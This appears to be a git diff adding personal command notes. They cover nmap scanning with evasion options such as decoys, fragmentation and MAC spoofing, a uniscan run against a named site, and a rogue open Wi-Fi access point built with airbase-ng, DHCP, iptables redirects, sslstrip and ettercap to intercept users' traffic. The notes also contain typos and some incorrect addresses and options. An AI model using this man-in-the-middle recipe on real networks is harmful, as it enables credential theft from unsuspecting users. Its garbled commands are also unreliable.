@@ -287,6 +287,129 @@ on server
 openssl req -new -newkey rsa:2048 -nodes -keyout geewatt.pythonanywhere.com.key -out geewatt.pythonanywhere.c
 om.csr
 
+namp ipaddress --vv
+
+ifconfig
+iwconfig
+
+ping scan
+sudo nmap -sP 192.168.0/24
+
+OS and Service detection performed
+
+sudo nmap -sS -A 192.168.0.1
+
+8 byte probe
+
+sudo nmap -f 192.168.0.1
+sudo nmap --mtu <multiple of 8> 192.168.0.1
+
+decoy
+
+sudo nmap -D RND:10 192.168.0.1
+
+idle
+
+sudo nmap -sT target 
+
+specific port
+sudo namp --source-port 54 192.168.0.1
+
+speficic packet length
+sudo namp --data-length 25 192.168.0.1
+
+randomize iorder of hosts
+sudo nmap --randomize-hosts 192.168.0.1-100
+
+generate random mac address
+sudo nmap -sT -PN --spoof-mac 0 192.168.0.1
+
+
+sudo nmap --badsum 192.168.0.1
+
+
+nslookup <host name>
+nsloopup <ip address>
+
+
+nmap -oG - 192.168.0.0-255 -p 4439 -vv >> scan.txt
+ cat scan.txt | grep Up | awk  -F " " '{print $2}' > ips.txt
+nmap -iL ips.txt -vv
+
+
+uniscan
+
+ip adrress
+uniscan -u www.graemestewartwatt.com
+
+uniscan -u www.graemestewartwatt.com -qweds
+
+dhcp
+
+sudo-apt get install isc-dhcp-server
+
+vim /etc/dhcpd.conf
+
+Authoritative;
+Default-lease-time 600;
+Max-lease-time 7200;
+Subnet 192.168.1.0 netmask 255.255.255.0 {
+Option routers 192.168.0.1.1;
+Option subnet-mask 255.255.255.0;
+Option domain-name "openwifi";
+Option domain-name-servers 102.198.1.1;
+Range 192.168.1.2 192.168.1.40;
+}
+
+nmap
+
+airmon-ng
+
+airmon-ng start <card not on internet>
+
+
+airbase-ng -c 11 -e openwifi mon0
+
+new terminal
+
+ifconfig at0 192.168.1.1 netmask 255.255.255.0
+ifconfig at0 mtu 1400
+route add -net 102.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.1.1
+iptables -p FORWARD ACCEPT
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REJECT --to-port 10000
+
+
+dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
+/etc/init.d/isc-dhcp-server start
+
+
+sslstrip -f -p -k 10000
+
+new terminal
+
+ettercap -p -u -T -q -i at0
+
+
+iptables
+
+-N is to create new policy
+-I is insert into the policy chain(putting at top)
+-J is to jump to policy chain 
+-L list policy (-n with out name resolution , -v verbose)
+-A append to end of policy
+-s source ip/host
+-d destination ip/host
+--dport destination port
+--sport sourceport
+--dports 0:65535 multiple ports
+--src-range/--dst-range 192.168.1.100-192.168.1.200 ip ranges﻿
+
+dd if=/Users/Shared/OS.dmg of=/dev/disk5 bs=1m
+
 
 
 
